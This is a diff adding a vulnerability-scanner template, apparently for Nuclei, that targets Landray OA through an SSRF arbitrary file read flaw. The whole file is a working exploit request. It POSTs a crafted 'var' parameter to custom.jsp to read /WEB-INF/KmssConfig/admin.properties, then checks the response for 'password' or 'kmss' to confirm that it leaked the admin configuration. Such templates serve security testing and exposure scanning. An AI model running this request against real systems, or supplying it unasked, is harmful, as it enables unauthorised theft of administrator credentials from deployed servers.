@@ -1,0 +1,27 @@
+id: landray-oa-ssrf-readfile
+
+info:
+  name: landray-oa-ssrf-readfile
+  author: wintrysec
+  severity: critical
+  description: 蓝凌OA-SSRF任意文件读取.
+  reference: https://github.com/DawnFlame/POChouse
+  tags: landray
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/sys/ui/extend/varkind/custom.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "password"
+          - "kmss"
+        condition: or
+      - type: status
+        status:
+          - 200
